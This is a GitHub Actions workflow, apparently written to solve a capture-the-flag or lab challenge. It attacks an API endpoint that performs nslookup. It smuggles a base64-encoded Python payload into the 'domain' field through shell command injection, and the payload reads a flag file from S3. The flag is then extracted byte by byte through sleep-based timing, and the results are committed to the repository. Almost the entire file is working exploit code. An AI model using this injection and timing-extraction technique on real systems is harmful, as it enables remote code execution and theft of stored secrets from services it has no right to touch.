name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Extract nibbles + calibrate + len-check + rstrip-verify
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          run_timed() {
            local label=$1; local b64=$2
            local INJ="x; echo $b64 | base64 -d | python3 #"
            local t0=$(date +%s%3N)
            curl -s -X POST "$URL" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
            local t1=$(date +%s%3N)
            local dt=$((t1-t0))
            echo "$label ${dt}ms"
            echo "$label ${dt}ms" >> nibbles4.txt
          }

          echo "# extraction run $(date -u)" > nibbles4.txt

          # Extract hi nibbles for bytes 0-15
          for i in $(seq 0 15); do
            PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]>>4)"
            run_timed "hi${i}" "$(echo -n "$PY" | base64 -w0)"
          done

          # Extract lo nibbles for bytes 0-15
          for i in $(seq 0 15); do
            PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(flag[${i}]&0xF)"
            run_timed "lo${i}" "$(echo -n "$PY" | base64 -w0)"
          done

          # Warm calibration: S3 read + sleep=0 (done AFTER nibbles so Lambda is warm)
          CAL_PY="import boto3,time;boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(0)"
          run_timed "cal_sleep0" "$(echo -n "$CAL_PY" | base64 -w0)"
          run_timed "cal_sleep0_2" "$(echo -n "$CAL_PY" | base64 -w0)"

          # Check flag length (sleep = len(flag) including any trailing newline)
          LEN_PY="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(len(flag))"
          run_timed "flag_len" "$(echo -n "$LEN_PY" | base64 -w0)"

          # Analyze nibbles -> compute FLAG_HEX
          ANALYSIS=$(python3 -c "
          timings = {}
          for line in open('nibbles4.txt'):
              p = line.strip().split()
              if len(p) == 2:
                  timings[p[0]] = int(p[1].replace('ms',''))
          c1 = timings.get('cal_sleep0', 2000)
          c2 = timings.get('cal_sleep0_2', 2000)
          overhead = (c1 + c2) / 2
          flag_bytes = []
          for i in range(16):
              hi = max(0, min(15, round((timings.get('hi'+str(i), overhead) - overhead) / 1000)))
              lo = max(0, min(15, round((timings.get('lo'+str(i), overhead) - overhead) / 1000)))
              flag_bytes.append((hi << 4) | lo)
          flag_hex = ''.join('{:02x}'.format(b) for b in flag_bytes)
          flag_ascii = ''.join(chr(b) if 32<=b<=126 else '.' for b in flag_bytes)
          fl = timings.get('flag_len', overhead)
          flag_len = round((fl - overhead) / 1000)
          print('OVERHEAD=' + str(round(overhead)))
          print('FLAG_HEX=' + flag_hex)
          print('FLAG_ASCII=' + flag_ascii)
          print('FLAG_LEN=' + str(flag_len))
          ")

          echo "$ANALYSIS"
          FLAG_HEX=$(echo "$ANALYSIS" | grep FLAG_HEX | cut -d= -f2)
          FLAG_ASCII=$(echo "$ANALYSIS" | grep FLAG_ASCII | cut -d= -f2)
          FLAG_LEN=$(echo "$ANALYSIS" | grep FLAG_LEN | cut -d= -f2)

          echo "# verify run $(date -u)" > verify4.txt
          echo "FLAG_HEX=$FLAG_HEX" >> verify4.txt
          echo "FLAG_ASCII=$FLAG_ASCII" >> verify4.txt
          echo "FLAG_LEN=$FLAG_LEN" >> verify4.txt

          # Verify using rstrip('\n') to handle potential trailing newline in S3 object
          PY_CMP="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();f=flag.rstrip(b'\n');time.sleep(10 if f==bytes.fromhex('${FLAG_HEX}') else (5 if f[:16]==bytes.fromhex('${FLAG_HEX}') else 2))"
          B64_CMP=$(echo -n "$PY_CMP" | base64 -w0)
          run_timed "verify_rstrip" "$B64_CMP"

          # Also verify without rstrip (to see old behavior for comparison)
          PY_CMP2="import boto3,time;flag=boto3.client('s3').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(10 if flag==bytes.fromhex('${FLAG_HEX}') else 2)"
          B64_CMP2=$(echo -n "$PY_CMP2" | base64 -w0)
          run_timed "verify_exact" "$B64_CMP2"

          cat nibbles4.txt
          cat verify4.txt

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add nibbles4.txt verify4.txt
          git commit -m "v4: rstrip verify + flag length check" || echo "Nothing to commit"
          git push origin corgi
